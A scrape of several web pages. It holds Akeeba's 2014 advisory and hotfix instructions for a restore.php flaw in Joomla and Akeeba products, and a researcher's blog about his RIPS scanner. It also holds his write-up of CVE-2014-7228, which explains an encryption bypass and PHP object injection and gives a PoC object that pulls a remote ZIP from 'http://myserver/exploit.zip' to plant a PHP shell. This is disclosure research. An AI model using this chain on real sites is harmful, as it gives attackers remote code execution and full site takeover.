The vulnerability was discovered and reported by [Johannes Dahse](http://syssec.rub.de/media/emma/veroeffentlichungen/2014/09/10/POPChainGeneration-CCS14.pdf) of Horst G√∂rtz Institute for IT-Security (HGI), Ruhr-University Bochum, Germany. A working proof of concept exploit was presented to us and the Joomla! Security Strike Team. The full disclosure of the vulnerability will be publicly released by Johannes shortly.

The overall risk severity for this security issue according to the [OWASP methodology](https://www.owasp.org/index.php/OWASP_Risk_Rating_Methodology) is **High**. More specifically, the likelihood is *Medium* (advanced knowledge and specific conditions required) and the impact is *High* (can lead to full compromise of the site).

CVE: not available at the time of this writing; please consult [joomla.org](http://joomla.org)

* [Contact Us](/contact-us.html?view=item)
* [News](/news.html)
* [About Akeeba](/our-team.html)
* [Terms of Service](/tos.html)
* [Cookies Policy](/cookies.html)
* [Privacy Statement](/privacy.html)
* [License](/license.html)
* [Compatibility](/compatibility.html)

Follow us:  [Follow us on Facebook](https://www.facebook.com/akeebaltd)   [Follow us on Twitter / X](https://twitter.com/akeebabackup)   [Follow our RSS feed](https://www.akeeba.com/news.feed)

Copyright ¬©2006-2025 Akeeba Ltd. All Rights Reserved.

Unauthorized copying of this site's design and its content, in parts or in whole, is prohibited without the prior written consent of the copyright holder.

This site is not affiliated with or endorsed by the Joomla! Project. It is not supported or warranted by the Joomla! Project or Open Source Matters. The
Joomla! logo is used under a limited license granted by Open Source Matters, the trademark holder in the United States and other countries.

We may collect your IP address and your browser's User Agent string while using our site for security¬†reasons and deriving aggregate information (analytics).



=== Content from www.akeebabackup.com_d62600b9_20250126_035953.html ===

[![Akeeba, Ltd.](/images/akeeba_4c.svg)](/)

* Products
  [All products](/products.html)
  [Akeeba Backup for Joomla!](/products/akeeba-backup.html)
  [Akeeba Backup for WordPress](/products/akeeba-backup-wordpress.html)
  [Admin Tools for Joomla!](/products/admin-tools.html)
  [Admin Tools for WordPress](/products/admin-tools-wordpress.html)
  [Akeeba Solo](/products/akeeba-solo.html)
  [Akeeba Panopticon](/products/panopticon.html)
  [Kickstart](/products/akeeba-kickstart.html)
  [Ticket System](/products/ats.html)
  [Social Login](/products/social-login.html)
  [UNiTE](/products/akeeba-unite.html)
  [Engage](/products/engage.html)
* [Subscribe](/subscribe.html)
* [Download](/download.html)
* Support
  [Support](/support.html)
  [Documentation](/documentation.html)
  [Video Tutorials](/videos.html)
* [Login](/login.html)

[Search our site](https://duckduckgo.com/?q=site%3Aakeeba.com)

Expand Menu

Close Menu

---

* Products
  [All products](/products.html)
  [Akeeba Backup for Joomla!](/products/akeeba-backup.html)
  [Akeeba Backup for WordPress](/products/akeeba-backup-wordpress.html)
  [Admin Tools for Joomla!](/products/admin-tools.html)
  [Admin Tools for WordPress](/products/admin-tools-wordpress.html)
  [Akeeba Solo](/products/akeeba-solo.html)
  [Akeeba Panopticon](/products/panopticon.html)
  [Kickstart](/products/akeeba-kickstart.html)
  [Ticket System](/products/ats.html)
  [Social Login](/products/social-login.html)
  [UNiTE](/products/akeeba-unite.html)
  [Engage](/products/engage.html)
* [Subscribe](/subscribe.html)
* [Download](/download.html)
* Support
  [Support](/support.html)
  [Documentation](/documentation.html)
  [Video Tutorials](/videos.html)
* [Login](/login.html)

# Contact Us

2. [Home](/)
3. [Contact Us](/contact-us.html?view=item)
4. ContactUs

**This site is operated by:**
 Akeeba Limited, Kantaras 37E., 2043 Strovolos, Nicosia, CYPRUS
VAT Number: CY10307966C
Company Reg. Number: HE 307966

If you have a pre-sales inquiry or want to contact us but you do not have access to our Support section please use this form to send us an email. Remember to select the correct
contact category when filing the form to help us get back to you as soon as possible.

**Any information you provide in the contact form may be transmitted to us over plain text (unencrypted) email**. Please do not provide passwords or other sensitive
information over the contact form. If you
accidentally provide such information we will delete
it at once.

If you want to send us sensitive information such as passwords or information regarding possible security issues **please use GPG encryption** using the [publicly verifiable GPG key](https://keybase.io/nikosdion) of our lead developer. You can paste the encrypted text in the contact form. We kindly request that you
provide your own GPG key so that our replies can be kept confidential as well.

Do not use this form for software support; requests of this kind will not be replied to. Support for our software is only provided to our subscribers and only through our site's [Support](/support.html) section.

Category¬†\*

Pre-sales request
User account / subscription problem
Bug report
Data Protection / Data Processing / Right To Be Forgotten

From (name)¬†\*

From (email)¬†\*

Subject¬†\*

Message text¬†\*

I consent to my personal information being processed by this site for the purpose of receiving a reply to my contact request.

You can read about how we process your personal information in our site's [privacy policy page](/privacy.html).

JavaScript is required for CAPTCHA verification to submit this form.

Send your message

* [Contact Us](/contact-us.html?view=item)
* [News](/news.html)
* [About Akeeba](/our-team.html)
* [Terms of Service](/tos.html)
* [Cookies Policy](/cookies.html)
* [Privacy Statement](/privacy.html)
* [License](/license.html)
* [Compatibility](/compatibility.html)

Follow us:  [Follow us on Facebook](https://www.facebook.com/akeebaltd)   [Follow us on Twitter / X](https://twitter.com/akeebabackup)   [Follow our RSS feed](https://www.akeeba.com/news.feed)

Copyright ¬©2006-2025 Akeeba Ltd. All Rights Reserved.

Unauthorized copying of this site's design and its content, in parts or in whole, is prohibited without the prior written consent of the copyright holder.

This site is not affiliated with or endorsed by the Joomla! Project. It is not supported or warranted by the Joomla! Project or Open Source Matters. The
Joomla! logo is used under a limited license granted by Open Source Matters, the trademark holder in the United States and other countries.

We may collect your IP address and your browser's User Agent string while using our site for security¬†reasons and deriving aggregate information (analytics).



=== Content from websec.wordpress.com_98ffbc97_20250126_035951.html ===

# [Reiners‚Äô Weblog](https://websec.wordpress.com/)

anything about Web Security

* [Home](https://websec.wordpress.com/)
* [Talks](https://websec.wordpress.com/talks/)
* [Tools](https://websec.wordpress.com/tools/)
* [About](https://websec.wordpress.com/about/)

## Tools

### PHP Scanner

This little tool scans PHP Scripts for potential vulnerable PHP functions and then traces back its parameters. With this you can easily see if a parameter of a vulnerable function comes from userinput. Additionally PHP Scanner allows you to mark those lines in the source (bottom frame) and build custom CURL code to exploit the issues found.

[![Manual](https://websec.wordpress.com/wp-content/uploads/2008/04/phpscan_1.jpg?w=128)](https://websec.wordpress.com/wp-content/uploads/2008/04/phpscan_1.jpg "Manual") [![Scan](https://websec.wordpress.com/wp-content/uploads/2008/04/phpscan_2.jpg?w=128)](https://websec.wordpress.com/wp-content/uploads/2008/04/phpscan_2.jpg "Scan")[![mouseover](https://websec.wordpress.com/wp-content/uploads/2008/06/phpscan_6.jpg?w=128)](https://websec.wordpress.com/wp-content/uploads/2008/06/phpscan_6.jpg "mouseover") [![highlight](https://websec.wordpress.com/wp-content/uploads/2008/04/phpscan_3.jpg?w=128)](https://websec.wordpress.com/wp-content/uploads/2008/04/phpscan_3.jpg "highlight") [![exploit](https://websec.wordpress.com/wp-content/uploads/2008/04/phpscan_4.jpg?w=128)](https://websec.wordpress.com/wp-content/uploads/2008/04/phpscan_4.jpg "exploit") [![curlcode](https://websec.wordpress.com/wp-content/uploads/2008/04/phpscan_5.jpg?w=128)](https://websec.wordpress.com/wp-content/uploads/2008/04/phpscan_5.jpg "exploit")

(new and open source version: see RIPS)

### RIPS ‚Äì A static source code analyser for vulnerabilities in PHP scripts

Finally I improved the code from my old PHP Scanner and the new tool called RIPS was released during the [Month of PHP Security](http://www.php-security.org). RIPS is open source and freely available at <http://sourceforge.net/projects/rips-scanner/>.

Some features:

* detect XSS, SQLi, File disclosure, LFI/RFI, RCE vulnerabilities and more
* 5 verbosity levels for debugging your scan results
* mark vulnerable lines in source code viewer
* user-defined function code by mouse-over on detected call
* list of all user-defined functions and program entry points (user input) connected to the source code viewer
* create CURL exploits for detected vulnerabilties with few clicks
* 7 different syntax highlighting colour schemata
* only minimal requirement is a local webserver with PHP and a browser (tested with Opera and Firefox)

[![RIPS - Codeviewer](https://websec.wordpress.com/wp-content/uploads/2007/11/rips1.jpg?w=150&h=91 "RIPS - Codeviewer")](https://websec.wordpress.com/wp-content/uploads/2007/11/rips1.jpg) [![RIPS - Exploit Creator](https://websec.wordpress.com/wp-content/uploads/2007/11/rips2.jpg?w=150&h=91 "RIPS - Exploit Creator")](https://websec.wordpress.com/wp-content/uploads/2007/11/rips2.jpg) [![RIPS - Function List + Mouseover](https://websec.wordpress.com/wp-content/uploads/2007/11/rips3.jpg?w=150&h=91 "RIPS - Function List + Mouseover")](https://websec.wordpress.com/wp-content/uploads/2007/11/rips3.jpg)

Please note that due to its missing support of OOP code and data flow analysis, the development was abandoned in 2013 and a complete new generation was developed that is available at [RIPS Technologies](https://www.ripstech.com).

### Share this:

* [Facebook](https://websec.wordpress.com/tools/?share=facebook "Click to share on Facebook")
* [X](https://websec.wordpress.com/tools/?share=x "Click to share on X")
Like Loading...

### 3 Responses to *Tools*

1. ![](https://2.gravatar.com/avatar/8ffcb60b70d07315136b1cab45bf02d3ed38637df0cf8228a72c5b2e5a5f0365?s=32&d=identicon&r=G) [lexak](http://theroot.ru) says:
   [February 4, 2011 at 6:29 pm](https://websec.wordpress.com/tools/#comment-662)

   Hi Johannes Dahse! Thank you for new release RIPS and comment me in CHANGELOG. It is very useful tools. I found some vulnerabilities in my site by RIPS. I will be glad to assist your project.

   [Reply](https://websec.wordpress.com/tools/?replytocom=662#respond)
3. ![](https://2.gravatar.com/avatar/be5ddaac70d39d9494adf23174e62782bdc6d3289c0abf2af1deec41380a7800?s=32&d=identicon&r=G) mp says:
   [August 31, 2011 at 1:39 pm](https://websec.wordpress.com/tools/#comment-969)

   Hi Johannes,

   would you mind to give a look and review my ‚Äòspecial‚Äô SQLi framework? I do think you will find it ‚Ä¶very useful, and maybe you could suggest me how to improve it.

   It‚Äôs at Woodmann for now, because I dont have the time to make a site for it‚Ä¶ maybe later in future.

   You can see a screenshot here to quickly understand what it is made and thought for..

   [![](https://i0.wp.com/img21.imageshack.us/img21/9943/siaf.jpg)](http://img21.imageshack.us/img21/9943/siaf.jpg)

   (on Woodmann‚Äôs CISTL <http://www.woodmann.com/collaborative/sectools/index.php/SiAF_-_SQLi_Attack_Framework> )

   [Reply](https://websec.wordpress.com/tools/?replytocom=969#respond)
5. ![](https://graph.facebook.com/100002841390362/picture?type=large&_md5=8e0399ae12de382d08df49c40de54b8d) [Sergey Vlasenko](http://www.facebook.com/profile.php?id=100002841390362) says:
   [November 18, 2011 at 3:11 pm](https://websec.wordpress.com/tools/#comment-1083)

   good job!

   [Reply](https://websec.wordpress.com/tools/?replytocom=1083#respond)

### Leave a comment [Cancel reply](/tools/#respond)

Œî

* ## Archives

  + [November 2016](https://websec.wordpress.com/2016/11/)
  + [January 2015](https://websec.wordpress.com/2015/01/)
  + [December 2014](https://websec.wordpress.com/2014/12/)
  + [October 2014](https://websec.wordpress.com/2014/10/)
  + [May 2013](https://websec.wordpress.com/2013/05/)
  + [March 2013](https://websec.wordpress.com/2013/03/)
  + [February 2013](https://websec.wordpress.com/2013/02/)
  + [June 2012](https://websec.wordpress.com/2012/06/)
  + [January 2012](https://websec.wordpress.com/2012/01/)
  + [December 2011](https://websec.wordpress.com/2011/12/)
  + [September 2011](https://websec.wordpress.com/2011/09/)
  + [June 2011](https://websec.wordpress.com/2011/06/)
  + [April 2011](https://websec.wordpress.com/2011/04/)
  + [December 2010](https://websec.wordpress.com/2010/12/)
  + [October 2010](https://websec.wordpress.com/2010/10/)
  + [June 2010](https://websec.wordpress.com/2010/06/)
  + [May 2010](https://websec.wordpress.com/2010/05/)
  + [March 2010](https://websec.wordpress.com/2010/03/)
  + [February 2010](https://websec.wordpress.com/2010/02/)
  + [November 2009](https://websec.wordpress.com/2009/11/)
  + [January 2009](https://websec.wordpress.com/2009/01/)
  + [December 2008](https://websec.wordpress.com/2008/12/)
  + [October 2008](https://websec.wordpress.com/2008/10/)
  + [September 2008](https://websec.wordpress.com/2008/09/)
  + [May 2008](https://websec.wordpress.com/2008/05/)
  + [November 2007](https://websec.wordpress.com/2007/11/)
* ## Categories

  + [CTF](https://websec.wordpress.com/category/ctf/)
  + [Java](https://websec.wordpress.com/category/java/)
  + [Other](https://websec.wordpress.com/category/other/)
  + [PHP](https://websec.wordpress.com/category/php/)
  + [Projects](https://websec.wordpress.com/category/projects/)
  + [SQLi](https://websec.wordpress.com/category/sqli/)
  + [Vulns](https://websec.wordpress.com/category/vulns/)
  + [Web Security](https://websec.wordpress.com/category/web-security/)
  + [XSS](https://websec.wordpress.com/category/xss/)
* ## active

  + [FluxFingers](http://www.fluxfingers.net "CTF team")
  + [RIPS Technologies](https://www.ripstech.com "RIPS Technologies")
  + [sla.ckers](http://sla.ckers.org/forum/ "WebAppSec forum")
  + [twitter](http://twitter.com/FluxReiners)
* ## blogs

  + [Bernardo Damele](http://bernardodamele.blogspot.com/)
  + [christ1an](http://christ1an.blogspot.com/)
  + [d0mber](http://d0mber.blogspot.com)
  + [Das Labor](http://www.das-labor.org/blog/)
  + [Gareth Heyes](http://www.thespanner.co.uk/)
  + [Gnarf](http://devels-playground.blogspot.com/)
  + [gnucitizen](http://www.gnucitizen.org/)
  + [hackademix](http://hackademix.net/)
  + [hackathology](http://hackathology.blogspot.com/)
  + [Kishor](http://wasjournal.blogspot.com/)
  + [kuza55](http://kuza55.blogspot.com/)
  + [pentestmonkey](http://pentestmonkey.net/blog/)
  + [PHPIDS](http://phpids.org/)
  + [RSnake](http://ha.ckers.org/)
  + [sirdarckcat](http://sirdarckcat.blogspot.com/)
  + [thornmaker](http://p42.us/)
* ## Meta

  + [Register](https://wordpress.com/start?ref=wplogin)
  + [Log in](https://websec.wordpress.com/wp-login.php)

[Create a free website or blog at WordPress.com.](https://wordpress.com/?ref=footer_website)

* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Reiners' Weblog](https://websec.wordpress.com)

  Join 114 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fwebsec.wordpress.com%2Ftools%2F&signup_flow=account)
* Privacy
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Reiners' Weblog](https://websec.wordpress.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fwebsec.wordpress.com%2Ftools%2F&signup_flow=account)
  + [Copy shortlink](https://wp.me/P8KAZ-4)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://websec.wordpress.com/tools/)
  + [View post in Reader](https://wordpress.com/read/blogs/2085741/posts/4)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

%d

![](https://pixel.wp.com/b.gif?v=noscript)
Design a site like this with WordPress.com[Get started](https://wordpress.com/start/?ref=marketing_bar)



=== Content from www.akeebabackup.com_8c21bb01_20250124_220937.html ===

[![Akeeba, Ltd.](/images/akeeba_4c.svg)](/)

* Products
  [All products](/products.html)
  [Akeeba Backup for Joomla!](/products/akeeba-backup.html)
  [Akeeba Backup for WordPress](/products/akeeba-backup-wordpress.html)
  [Admin Tools for Joomla!](/products/admin-tools.html)
  [Admin Tools for WordPress](/products/admin-tools-wordpress.html)
  [Akeeba Solo](/products/akeeba-solo.html)
  [Akeeba Panopticon](/products/panopticon.html)
  [Kickstart](/products/akeeba-kickstart.html)
  [Ticket System](/products/ats.html)
  [Social Login](/products/social-login.html)
  [UNiTE](/products/akeeba-unite.html)
  [Engage](/products/engage.html)
* [Subscribe](/subscribe.html)
* [Download](/download.html)
* Support
  [Support](/support.html)
  [Documentation](/documentation.html)
  [Video Tutorials](/videos.html)
* [Login](/login.html)

[Search our site](https://duckduckgo.com/?q=site%3Aakeeba.com)

Expand Menu

Close Menu

---

* Products
  [All products](/products.html)
  [Akeeba Backup for Joomla!](/products/akeeba-backup.html)
  [Akeeba Backup for WordPress](/products/akeeba-backup-wordpress.html)
  [Admin Tools for Joomla!](/products/admin-tools.html)
  [Admin Tools for WordPress](/products/admin-tools-wordpress.html)
  [Akeeba Solo](/products/akeeba-solo.html)
  [Akeeba Panopticon](/products/panopticon.html)
  [Kickstart](/products/akeeba-kickstart.html)
  [Ticket System](/products/ats.html)
  [Social Login](/products/social-login.html)
  [UNiTE](/products/akeeba-unite.html)
  [Engage](/products/engage.html)
* [Subscribe](/subscribe.html)
* [Download](/download.html)
* Support
  [Support](/support.html)
  [Documentation](/documentation.html)
  [Video Tutorials](/videos.html)
* [Login](/login.html)

# Security update, September 2014

**30 September 2014**
Last updated on 30 September 2014

**Executive summary**: It is possible for a remote attacker to extract a remotely hosted archive while you are extracting a backup archive / installing an update, depending on your server settings. The attack is **NOT** possible at any other time. Merely having our software installed **DOES NOT** make your site vulnerable. The vulnerability was discovered and reported by [Johannes Dahse](https://twitter.com/FluxReiners) of Horst G√∂rtz Institute for IT-Security (HGI), Ruhr-University Bochum, Germany.

### Affected software

* Akeeba Backup for Joomla! Professional, version 3.0.0 up to and including 4.0.2
* Akeeba Backup Professional for WordPress, 1.0.b1 up to and including 1.1.3
* Akeeba Solo, 1.0.b1 up to and including 1.1.2
* Admin Tools Core and Professional, version 2.0.0 up to and including 2.4.4. Later versions are not affected as they do not include the Joomla! update feature.
* Akeeba CMS Update, version 1.0.a1 up to and including 1.0.1
* Joomla! 2.5, 3.0, 3.1, 3.2, 3.3 up to and including 3.3.4

### Impact

Merely having the affected software installed **DOES NOT** allow an attacker to compromise (hack) your site. An attacker has to attack at precisely the right moment: while a backup archive or Joomla! update package is being extracted at your site.

### Vulnerability disclosure

The affected software use Akeeba Restore (restore.php) to extract backup archives and update packages of the ZIP, JPA and JPS format. In order to protect from abuse by third parties the restore.php file won‚Äôt work until the software it‚Äôs used with generated a file called restoration.php. That file contains a cryptographic key which is used to authenticate the commands sent to restore.php.

The restoration.php file is created right before a. you extract a backup archive with the integrated restoration feature of Akeeba Backup / Akeeba Solo and b. you extract the Joomla! update package using Admin Tools, Akeeba CMS Update and Joomla! Update. The file is immediately removed after the extraction is complete. When the file is not present the restore.php file refuses any and all commands. Therefore, when you are not extracting a backup archive or updating your site it is not vulnerable to any attacks.

There is a bug discovered in restore.php which only appears when restoration.php is present, i.e. while a backup or update archive is being extracted on your site. Normally, only encrypted commands should be processed. Due to the bug you can bypass the encryption and send arbitrary commands to restore.php and only while it is extracting a backup or update archive. A malicious user with advanced knowledge could craft a special command message which would cause restore.php to extract a remotely stored archive to your site.

For this attack to work there are several conditions which must be met *at the same time*:

* A host with URL fopen() wrappers
* A host which allows direct file writes
* An attacker with advanced knowledge of PHP to craft the malicious message
* An attacker able to time his attack at the very short period of time (typically 5 to 90 seconds) it takes for a backup archive or update package to be extracted.

Due to the special conditions required merely having the affected software installed **DOES NOT** make your site vulnerable. However, this security issue *can* be used for targeted attacks against valuable targets. It‚Äôs worth noting that this kind of attack does leave a remarkable audit trail in the server log files.

### Corrective actions for subscribers

We have released new versions of Akeeba Backup for Joomla!, Akeeba Backup for WordPress, Akeeba Solo and Akeeba CMS Update in their currently maintained version branches.

Due to the severity of this security issue we are also releasing new versions of the unsupported, but affected, version branches of Akeeba Backup for Joomla! and Admin Tools. These new versions do not imply any change in our support policy. They are provided as a courtesy. The Compatibility page on our site has been updated accordingly.

Moreover we have been in touch with the Joomla! project. New versions of Joomla! 2.5 and 3.x will be released shortly today.

### Corrective actions for non-subscribers (manual mitigation)

If you are no longer a subscriber you **DO NOT** need to re-subscribe to get this security issue fixed. Instead follow these manual mitigation measures. Additionally, if you are using an old and unsupported version of Joomla! you can follow the same instructions.

1. Download the [restore-hotfix.zip](http://cdn.akeebabackup.com/downloads/restore/restore-hotfix.zip) file
2. Extract the restore-hotfix.zip file on your computer. You will now have a restore.php file.
3. Upload the extracted restore.php file to the following locations (some of these directories may not exist if you don‚Äôt have the respective software installed on your site, in which case you can ignore them):
   * **Joomla! 2.5 / 3.x**: administrator/components/com\_joomlaupdate/restore.php
   * **Akeeba CMS Update**: administrator/components/com\_cmsupdate/restore.php
   * **Akeeba Backup for Joomla! Professional**: administrator/components/com\_akeeba/restore.php
   * **Admin Tools 2.0.0 to 2.4.4**: administrator/components/com\_admintools/restore.php

**VERY IMPORTANT:** You may find other files called restore.php on your site. DO NOT REPLACE THEM. They are not the same file. Replacing them will cause problems with your site.

### Acknowledgments and additional information

The vulnerability was discovered and reported by [Johannes Dahse](http://syssec.rub.de/media/emma/veroeffentlichungen/2014/09/10/POPChainGeneration-CCS14.pdf) of Horst G√∂rtz Institute for IT-Security (HGI), Ruhr-University Bochum, Germany. A working proof of concept exploit was presented to us and the Joomla! Security Strike Team. The full disclosure of the vulnerability will be publicly released by Johannes shortly.

The overall risk severity for this security issue according to the [OWASP methodology](https://www.owasp.org/index.php/OWASP_Risk_Rating_Methodology) is **High**. More specifically, the likelihood is *Medium* (advanced knowledge and specific conditions required) and the impact is *High* (can lead to full compromise of the site).

CVE: not available at the time of this writing; please consult [joomla.org](http://joomla.org)

* [Contact Us](/contact-us.html?view=item)
* [News](/news.html)
* [About Akeeba](/our-team.html)
* [Terms of Service](/tos.html)
* [Cookies Policy](/cookies.html)
* [Privacy Statement](/privacy.html)
* [License](/license.html)
* [Compatibility](/compatibility.html)

Follow us:  [Follow us on Facebook](https://www.facebook.com/akeebaltd)   [Follow us on Twitter / X](https://twitter.com/akeebabackup)   [Follow our RSS feed](https://www.akeeba.com/news.feed)

Copyright ¬©2006-2025 Akeeba Ltd. All Rights Reserved.

Unauthorized copying of this site's design and its content, in parts or in whole, is prohibited without the prior written consent of the copyright holder.

This site is not affiliated with or endorsed by the Joomla! Project. It is not supported or warranted by the Joomla! Project or Open Source Matters. The
Joomla! logo is used under a limited license granted by Open Source Matters, the trademark holder in the United States and other countries.

We may collect your IP address and your browser's User Agent string while using our site for security¬†reasons and deriving aggregate information (analytics).



=== Content from websec.wordpress.com_4a9aa289_20250124_220936.html ===

# [Reiners‚Äô Weblog](https://websec.wordpress.com/)

anything about Web Security

* [Home](https://websec.wordpress.com/)
* [Talks](https://websec.wordpress.com/talks/)
* [Tools](https://websec.wordpress.com/tools/)
* [About](https://websec.wordpress.com/about/)

## Joomla! 3.3.4 / Akeeba Kickstart ‚Äì Remote Code Execution¬†(CVE-2014-7228)

In our latest [paper](http://syssec.rub.de/media/emma/veroeffentlichungen/2014/09/10/POPChainGeneration-CCS14.pdf) we evaluated the [new RIPS prototype](http://syssec.rub.de/media/emma/veroeffentlichungen/2014/01/21/rips-NDSS14.pdf) regarding its ability to statically detect [PHP object injection](https://www.nds.rub.de/media/hfs/attachments/files/2010/03/hackpra09_fu_esser_php_exploits1.pdf) (POI) vulnerabilities and related [gadget chains](/2014/10/03/joomla-3-0-2-poi-cve-2013-1453-gadget-chains/) in PHP applications. Among others, the prototype reported a previously unknown POI vulnerability in Joomla 3.0.2. It turned out, that this vulnerability was still present in the (at that time) latest [Joomla! 3.3.4](http://joomlacode.org/gf/download/frsrelease/19752/160963/Joomla_3.3.4-Stable-Full_Package.zip) version. However, it appeared to be not exploitable because of some requirements and missing chains. Lately, I had a look at it again and found a way to exploit it in 5 steps. The last step still makes exploitation difficult and the severity can be rated as *high*.

### 1. Encryption Bypass

The vulnerability affects the [Akeeba Kickstart](https://www.akeebabackup.com/products/akeeba-kickstart.html) package used in Joomla‚Äôs *com\_joomlaupdate* component located in *administrator/components/com\_joomlaupdate/restore.php*. This file is remotely accessible to any unprivileged (not logged-in) user and no authentication check is performed by Joomla!. It is used to install new Joomla! updates from a local *ZIP* file.

In the *masterSetup()* function, Akeeba Kickstart checks for an existing *restoration.php* file and includes it to initialize basic setup parameters. If the *restoration.php* file does not exist, the execution is aborted. We will come back to this condition later.

```

$setupFile = 'restoration.php';

if( !file_exists($setupFile) )
{
	// Uh oh... Somebody tried to pooh on our back yard. Lock the gates! Don't let the traitor inside!
	AKFactory::set('kickstart.enabled', false);
	return false;
}

// Load restoration.php. It creates a global variable named $restoration_setup
require_once $setupFile;

```

Once the file is successfully included, a Joomla! update is performed based on the included setup parameters and externally provided parameters. To avoid tampering, the external parameters are encrypted with AES-128 in CTR mode. However, it is possible to completely bypass the encryption abusing PHP oddities. In Akeeba Kickstart, all parameters are fetched with the *getQueryParam()* function.

```

function getQueryParam( $key, $default = null )
{
	if(array_key_exists($key, $_REQUEST)) {
		$value = $_REQUEST[$key];
	} elseif(array_key_exists($key, $_POST)) {
		$value = $_POST[$key];
	} elseif(array_key_exists($key, $_GET)) {
		$value = $_GET[$key];
	} else {
		return $default;
	}
	return $value;
}

```

It returns parameters from the superglobal *$\_REQUEST*, *$\_POST*, or *$\_GET* array, if existent. First, the external setup parameter *json* is fetched through *getQueryParam()*. Then, all entries in the *$\_REQUEST* array are removed to delete all other parameters supplied by the user.

```

$json = getQueryParam('json', null);

if(!empty($_REQUEST))
{
	foreach($_REQUEST as $key => $value)
	{
		unset($_REQUEST[$key]);
	}
}

```

However, *$\_REQUEST* holds only a copy (not a reference) of *$\_GET* and *$\_POST* entries. That means that all provided GET and POST parameters are still available in the corresponding array, even when unset in *$\_REQUEST*. The next lines decrypt the *json* parameter and populate its json encoded data into the *$\_REQUEST* array again.

```

// Decrypt a possibly encrypted JSON string
if(!empty($json))
{
	$password = AKFactory::get('kickstart.security.password', null);
	if(!empty($password))
	{
		$json = AKEncryptionAES::AESDecryptCtr($json, $password, 128);
	}

	// Get the raw data
	$raw = json_decode( $json, true );
	// Pass all JSON data to the request array
	if(!empty($raw))
	{
		foreach($raw as $key => $value)
		{
			$_REQUEST[$key] = $value;
		}
	}
}

```

At this point, an attacker can leave the *json* parameter empty. The function *getQueryParam()* still returns parameters from *$\_GET* and *$\_POST* because only the *$\_REQUEST* array was emptied. This way, no encryption key is required to provide further setup parameters that are fetched through *getQueryParam()*.

### 2. PHP Object Injection

The POI vulnerability is straight-forward and appears in the next lines. The *factory* parameter is fetched through *getQueryParam()* and fed into the *unserialize()* method of *AKFactory*.

```

// A "factory" variable will override all other settings.
$serialized = getQueryParam('factory', null);
if( !is_null($serialized) )
{
	// Get the serialized factory
	AKFactory::unserialize($serialized);
}

```

This method basically base64 decodes the parameter and instantiates the *AKFactory* class by unserializing the serialized object and storing it as instance.

#### Gadget Chains

Lets have a quick look at available gadgets. Akeeba Kickstart‚Äôs *restore.php* file works independently from the Joomla! code base. That means that no classes of Joomla! are loaded and no initial gadgets of Joomla! can be abused. However, it ships some own classes with defined magic methods.

```

class AKAbstractUnarchiver
{
	public function __wakeup()
	{
		if($this->currentPartNumber >= 0)
		{
			$this->fp = @fopen($this->archiveList[$this->currentPartNumber], 'rb');
			...
		}
	}
}

class AKPostprocFTP
{
	function __wakeup()
	{
		$this->connect();
	}

	public function connect()
	{
		// Connect to server, using SSL if so required
		if($this->useSSL) {
			$this->handle = @ftp_ssl_connect($this->host, $this->port);
		} else {
			$this->handle = @ftp_connect($this->host, $this->port);
		}
		...
	}
}

```

These gadget chains do not impose a big security risk though and can at most be abused for SSRF or [DoS](http://blog.cinu.pl/2012/12/joomla-vulnerability-transforms-web.html). Considering the precondition of manually creating the *restoration.php* file, I felt this is not really exploitable, regardless of the encryption bypass.

### 3. Remote Code Execution

An important lesson I learned from this vulnerability is to not only have a look at the triggered gadget chains of a POI, but also to not forget to look at how the injected object affects the control flow after the injection. Until now, we have full control over the *AKFactory* instance with the PHP object injection that was triggered in the *masterSetup()* function.

```

masterSetup();

$retArray = array(
	'status'	=> true,
	'message'	=> null
);

$enabled = AKFactory::get('kickstart.enabled', false);

if($enabled)
{
	$task = getQueryParam('task');

	switch($task)
	{
		case 'ping':
			// ping task - realy does nothing!
			$timer = AKFactory::getTimer();
			$timer->enforce_min_exec_time();
			break;
		case 'startRestore':
			AKFactory::nuke(); // Reset the factory
		case 'stepRestore':
			$engine = AKFactory::getUnarchiver(); // Get the engine
			$observer = new RestorationObserver(); // Create a new observer
			$engine->attach($observer); // Attach the observer
			$engine->tick();
			...
			$retArray['files'] = $observer->filesProcessed;
			$retArray['bytesIn'] = $observer->compressedTotal;
			$retArray['bytesOut'] = $observer->uncompressedTotal;
			$retArray['status'] = true;
			$retArray['done'] = false;
			$retArray['factory'] = AKFactory::serialize();
			...
			break;
	}
}

```

After the update is prepared by the *masterSetup()*, we can start an update by setting the *task* parameter to *startRestore* or trigger the next step of the update by setting it to *stepRestore*. This API is used by AJAX requests to constantly check for the update status by reading the content of the later printed *$retArray*.

Since the *AKFactory* is under our control, we can manipulate its settings and data. It holds an *AKUnarchiver* object that is responsibe to extract files from a given archive file (ZIP, [JPS](https://www.akeebabackup.com/documentation/akeeba-backup-documentation/jps-archive-format.html), or [JPA](https://www.akeebabackup.com/documentation/akeeba-backup-documentation/jpa-archive-format.html) format). The *AKUnarchiver* is fetched in line 5597 and its next step is invoked in line 5600. The different formats are parsed in different classes and I will not cover the details here. The important thing is, that all these unpacking classes extend the class *AKAbstractUnarchiver* and inherit the magic method *\_\_wakeup()* already introduced in step 2.

```

class AKAbstractUnarchiver
{
	public function __wakeup()
	{
		if($this->currentPartNumber >= 0)
		{
			$this->fp = @fopen($this->archiveList[$this->currentPartNumber], 'rb');
			...
		}
	}
}

```

If the PHP setting *allow\_url\_fopen* is enabled (which is the [default](http://php.net/manual/en/filesystem.configuration.php#ini.allow-url-fopen)) we can point to an external archive file that is then extracted to the destination directory of our choice. This way, an attacker can get remote code execution on the targeted web server, by extracting a PHP shell into the targeted Joomla installation from a ZIP archive on his web server. The injected *AKFactory* could look similar to the following PoC:

```

// very short, non-working PoC

class AKFactory {
	public function __construct() {
		$this->objectlist['AKUnarchiverZip'] = new AKUnarchiverZip;
		$this->varlist['kickstart.enabled'] = true;
		$this->varlist['kickstart.security.password'] = '';
	}
}

class AKUnarchiverZIP {
	public function __construct() {
		$this->archiveList[0] = 'http://myserver/exploit.zip';
		$this->addPath = '/var/www/joomla/';
	}
}

```

